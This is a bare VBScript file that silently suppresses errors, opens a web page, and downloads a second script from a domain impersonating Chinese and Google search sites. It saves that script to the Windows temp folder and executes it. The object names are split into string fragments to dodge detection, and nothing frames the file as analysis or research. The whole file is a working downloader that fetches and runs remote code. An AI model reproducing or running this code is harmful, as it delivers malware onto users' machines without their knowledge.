on error resume next
Set a1t144k6 = CreateObject("Wscript.Shell") 
a1t144k6.Run("http://www.xsp5.info/index3.htm")

Set bhip9mnk = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP")
Set c9fu46wd = CreateObject("A"&"D"&"O"&"DB.St"&"r"&"ea"&"m")
With bhip9mnk
d6k8f7l3 = "http://dd8.china.sogou.google.baidu.com.baidu163so.info/vbs/dian.vbs"
.open "GET", d6k8f7l3, 0
.Send()
End With
ej1k8x28=CreateObject("Scriptin"&"g.FileSyst"&"emObject").GetSpecialFolder(2) &"\ssbb5.vbs"
With c9fu46wd
.Type = eval("1")
.Mode = eval("3")
.open()
.write eval("bhip9mnk.res"&"po"&"nse"&"Bod"&"y")
.SaveToFile ej1k8x28, eval("2")
End With
a1t144k6.Run ej1k8x28, , True
c9fu46wd.Close
